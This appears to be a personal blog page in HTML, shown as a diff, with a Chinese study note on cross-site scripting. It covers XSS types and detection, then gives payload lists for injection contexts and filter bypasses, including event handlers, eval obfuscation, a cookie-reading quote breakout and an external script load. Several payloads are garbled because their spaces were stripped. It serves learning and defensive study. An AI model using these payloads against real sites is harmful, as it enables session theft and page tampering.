@@ -1,0 +1,370 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1704635108417">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1704635108417" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#xss">XSS</a>
+<ul>
+<li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li>
+<li><a href="#%E5%88%86%E7%B1%BB">分类</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B">检测</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB">攻击</a>
+<ul>
+<li><a href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8xss%E7%9A%84%E5%9C%B0%E6%96%B9">可能存在XSS的地方</a>
+<ul>
+<li><a href="#html%E8%8A%82%E7%82%B9">HTML节点</a></li>
+<li><a href="#html%E5%B1%9E%E6%80%A7">HTML属性</a></li>
+<li><a href="#js%E4%BB%A3%E7%A0%81">JS代码</a></li>
+<li><a href="#%E5%AF%8C%E6%96%87%E6%9C%AC">富文本</a></li>
+</ul>
+</li>
+<li><a href="#bypass">ByPass</a>
+<ul>
+<li><a href="#%E6%A0%87%E7%AD%BE%E9%99%90%E5%88%B6">标签限制</a></li>
+<li><a href="#%E9%99%90%E5%88%B6%E5%8A%A8%E4%BD%9C">限制动作</a></li>
+<li><a href="#%E5%BC%95%E5%8F%B7%E9%80%83%E9%80%B8">引号逃逸</a></li>
+<li><a href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6">长度限制</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%8D%B1%E5%AE%B3">危害</a></li>
+<li><a href="#%E9%9A%8F%E7%AC%94">随笔</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">XSS</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-05-13 / 4 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="xss">XSS</h1>
+<h2 id="概述">概述</h2>
+<p>简单的说，攻击者构造的恶意脚本代码被浏览器运行了</p>
+<h2 id="分类">分类</h2>
+<ul>
+<li>
+<p>反射型</p>
+<p>一次性的，一般攻击者会诱骗用户点击某个链接，从而使页面运行嵌入的脚本</p>
+</li>
+<li>
+<p>存储型</p>
+<p>长时间的，构造的恶意代码被写入到了数据库，用户访问页面（正常页面）时会从数据库中调出该恶意代码，继而恶意代码执行</p>
+</li>
+<li>
+<p>DOM型</p>
+<p>基于⽂档对象模型DOM（Document Objeet Model），不经过后端，直接改变当前页面，其实可以归类到反射型中</p>
+</li>
+</ul>
+<h2 id="检测">检测</h2>
+<p>如果可以知道输出位置，试着输入特殊符号<code>&lt;&gt;()'&quot;</code>，查看HTML源代码是否被转义。如未被转义，可能存在漏洞</p>
+<p>如果无法知道输出位置，构造看起来正常的文本，从而骗过管理员（</p>
+<p>当然，扫描器也成。</p>
+<h2 id="攻击">攻击</h2>
+<h3 id="可能存在xss的地方">可能存在XSS的地方</h3>
+<h4 id="html节点">HTML节点</h4>
+<pre><code>&lt;div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;/p
+</code></pre>
+<p>payload</p>
+<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;
+</code></pre>
+<pre><code>&lt;svg/onload=alert()&gt;
+</code></pre>
+<h4 id="html属性">HTML属性</h4>
+<pre><code>&lt;imgsrc=&quot;#{image}&quot;/&gt;
+&lt;inputvalue=&quot;#{text}&quot;/&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>&lt;imgsrc=&quot;1&quot;onerror=&quot;alert(1)&quot;/&gt;
+&lt;inputvalue=&quot;1&quot;onclick=&quot;alert(1)&quot;/&gt;
+&lt;imgsrc=&quot;javascript:alert(1)&quot;/&gt;
+&quot;,',`
+</code></pre>
+<h4 id="js代码">JS代码</h4>
+<pre><code>&lt;script&gt;
+vardata=&quot;#{data}&quot;;
+&lt;/script&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>hello&quot;;alert(1);&quot;
+</code></pre>
+<h4 id="富文本">富文本</h4>
+<p>=v=</p>
+<h3 id="bypass">ByPass</h3>
+<h4 id="标签限制">标签限制</h4>
+<p>限制了就用没限制的呗</p>
+<p>Body标签</p>
+<pre><code>&lt;bodyonpageshow=alert(1)&gt;
+</code></pre>
+<p>Style标签</p>
+<pre><code>&lt;styleonload=alert(1)/&gt;
+</code></pre>
+<p>Marquee标签</p>
+<pre><code>&lt;marqueebehavior=&quot;alternate&quot;onstart=alert(1)&gt;hacktheplanet&lt;/marquee&gt;&lt;marqueeloop=&quot;1&quot;
+onfinish=alert(1)&gt;hacktheplanet&lt;/marquee&gt;&lt;marqueeonstart=alert(1)&gt;hacktheplanet&lt;/marquee&gt;
+</code></pre>
+<p>media标签</p>
+<pre><code>&lt;audiooncanplay=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;audioondurationchange=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;audioautoplay=trueonended=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;audioonloadeddata=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;audioonloadedmetadata=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;audioonloadstart=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;audioonprogress=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;audioonsuspend=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
+&lt;videooncanplay=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+&lt;videoondurationchange=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+&lt;videoautoplay=trueonended=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+&lt;videoonloadeddata=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+&lt;videoonloadedmetadata=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+&lt;videoonloadstart=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+&lt;videoonprogress=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+&lt;videoonsuspend=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
+</code></pre>
+<h4 id="限制动作">限制动作</h4>
+<pre><code>eval('~a~le~rt~~(~~1~~)~'.replace(/~/g,''))
+</code></pre>
+<pre><code>eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g,newString()))
+</code></pre>
+<pre><code>varx=eval;x('alert(1)')
+</code></pre>
+<pre><code>varx=eval;x('alert(1)')
+</code></pre>
+<h4 id="引号逃逸">引号逃逸</h4>
+<pre><code>&lt;script&gt;
+varid=&quot;接收参数传进来的值&quot;;
+&lt;/script&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>xss_attack&quot;%0aalert(document.cookie)%0a&quot;
+</code></pre>
+<p>XSS利用编码绕过参考文章</p>
+<p>https://blog.csdn.net/qq_37133717/article/details/94651840</p>
+<p>https://blog.csdn.net/Fly_hps/article/details/82944455</p>
+<h4 id="长度限制">长度限制</h4>
+<p>使用特殊符号一个顶俩、使用别的标签</p>
+<pre><code>&lt;script/src=//⑭.₨&gt;
+</code></pre>
+<p>https://www.freebuf.com/column/220970.html</p>
+<h2 id="危害">危害</h2>
+<p>盗取cookie</p>
+<p>修改网页内容</p>
+<p>挂马</p>
+<p>重定向（引流、跳转别的危险页面</p>
+<p>XSS蠕虫</p>
+<h2 id="随笔">随笔</h2>
+<p>后期按时更新（两天一更），顺便帮助自己复习</p>
+<p>学一点有一点的欢喜！</p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/xin-xi-shou-ji-zhi-min-gan-lu-jing/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  信息收集之敏感路径
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/">
+                <h3 class="post-title">
+                  我眼中的红队（转载）
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
